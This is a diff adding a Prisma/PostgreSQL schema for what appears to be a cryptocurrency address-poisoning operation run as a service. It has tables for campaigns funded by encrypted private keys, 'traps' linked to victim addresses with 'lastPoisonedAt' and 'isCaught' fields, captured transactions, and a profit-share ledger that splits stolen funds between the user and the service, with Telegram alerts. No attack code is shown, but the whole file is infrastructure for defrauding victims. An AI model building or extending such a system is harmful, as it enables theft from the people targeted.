@@ -1,0 +1,94 @@
+generator client {
+  provider = "prisma-client-js"
+}
+
+datasource db {
+  provider = "postgresql"
+  url      = env("DATABASE_URL")
+}
+
+model User {
+  id                 String   @id @default(uuid())
+  email              String   @unique
+  passwordHash       String
+  profitSplitPercent Float    @default(25.0)
+  telegramBotToken   String?
+  telegramChatId     String?
+  createdAt          DateTime @default(now())
+  updatedAt          DateTime @updatedAt
+
+  campaigns Campaign[]
+}
+
+model Campaign {
+  id                   String   @id @default(uuid())
+  userId               String
+  user                 User     @relation(fields: [userId], references: [id])
+  chain                String
+  fundingPrivateKeyEnc String
+  safeWalletAddress    String
+  status               String   @default("active")
+  lastGeneratedIndex   Int      @default(0)
+  createdAt            DateTime @default(now())
+  updatedAt            DateTime @updatedAt
+
+  traps          Trap[]
+  transactions   Transaction[]
+  tokenTransfers TokenTransfer[] // <-- NEW: opposite of TokenTransfer.campaign
+}
+
+model Trap {
+  id                  String    @id @default(uuid())
+  campaignId          String
+  campaign            Campaign  @relation(fields: [campaignId], references: [id])
+  victimAddress       String
+  counterpartyAddress String?
+  trapPrivateKeyEnc   String
+  trapAddress         String
+  lastPoisonedAt      DateTime?
+  isCaught            Boolean   @default(false)
+  createdAt           DateTime  @default(now())
+  updatedAt           DateTime  @updatedAt
+
+  @@unique([campaignId, trapAddress])
+}
+
+model Transaction {
+  id          String   @id @default(uuid())
+  campaignId  String
+  campaign    Campaign @relation(fields: [campaignId], references: [id])
+  trapAddress String
+  tokenSymbol String
+  amount      Decimal  @db.Decimal(36, 18)
+  usdValue    Decimal? @db.Decimal(36, 18)
+  txHash      String   @unique
+  type        String
+  status      String   @default("pending")
+  createdAt   DateTime @default(now())
+
+  profitShare ProfitShare? // <-- NEW: opposite of ProfitShare.transaction
+}
+
+model ProfitShare {
+  id                 String      @id @default(uuid())
+  transactionId      String      @unique
+  transaction        Transaction @relation(fields: [transactionId], references: [id])
+  userAmount         Decimal     @db.Decimal(36, 18)
+  serviceAmount      Decimal     @db.Decimal(36, 18)
+  userShareTxHash    String?
+  serviceShareTxHash String?
+  settledAt          DateTime?
+}
+
+model TokenTransfer {
+  id              String    @id @default(uuid())
+  transactionHash String    @unique
+  blockNumber     Int
+  tokenAddress    String
+  sender          String
+  receiver        String
+  value           String
+  chainId         Int
+  campaignId      String?
+  campaign        Campaign? @relation(fields: [campaignId], references: [id])
+}
